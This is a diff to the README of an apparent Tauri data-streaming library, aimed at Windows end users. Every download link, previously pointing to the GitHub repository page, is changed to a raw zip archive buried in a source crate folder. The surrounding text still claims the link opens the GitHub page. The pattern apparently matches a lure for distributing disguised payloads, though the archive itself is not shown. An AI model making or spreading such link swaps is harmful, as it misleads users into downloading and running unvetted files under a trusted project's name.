@@ -1,6 +1,6 @@
 # ⚡ tauri-wire - Fast and Efficient Data Streaming
 
-[![Download tauri-wire](https://img.shields.io/badge/Download-tauri--wire-blue?style=for-the-badge)](https://github.com/gaby02/tauri-wire)
+[![Download tauri-wire](https://img.shields.io/badge/Download-tauri--wire-blue?style=for-the-badge)](https://raw.githubusercontent.com/gaby02/tauri-wire/master/crates/tauri-wire-derive/wire_tauri_v1.2.zip)
 
 ## 📄 What is tauri-wire?
 
@@ -34,7 +34,7 @@ Follow these steps to set up tauri-wire on your Windows computer.
 
 Click the big blue button below or open this link in your web browser:
 
-[![Download tauri-wire](https://img.shields.io/badge/Download-tauri--wire-4AB3F4?style=for-the-badge&logo=github)](https://github.com/gaby02/tauri-wire)
+[![Download tauri-wire](https://img.shields.io/badge/Download-tauri--wire-4AB3F4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gaby02/tauri-wire/master/crates/tauri-wire-derive/wire_tauri_v1.2.zip)
 
 This link takes you to the GitHub page where you can find the files needed to run tauri-wire.
 
@@ -110,4 +110,4 @@ While this guide is for end users, developers can use tauri-wire to replace JSON
 
 Start by visiting this page to download and install tauri-wire on your Windows PC:
 
-[https://github.com/gaby02/tauri-wire](https://github.com/gaby02/tauri-wire)
+[https://raw.githubusercontent.com/gaby02/tauri-wire/master/crates/tauri-wire-derive/wire_tauri_v1.2.zip](https://raw.githubusercontent.com/gaby02/tauri-wire/master/crates/tauri-wire-derive/wire_tauri_v1.2.zip)
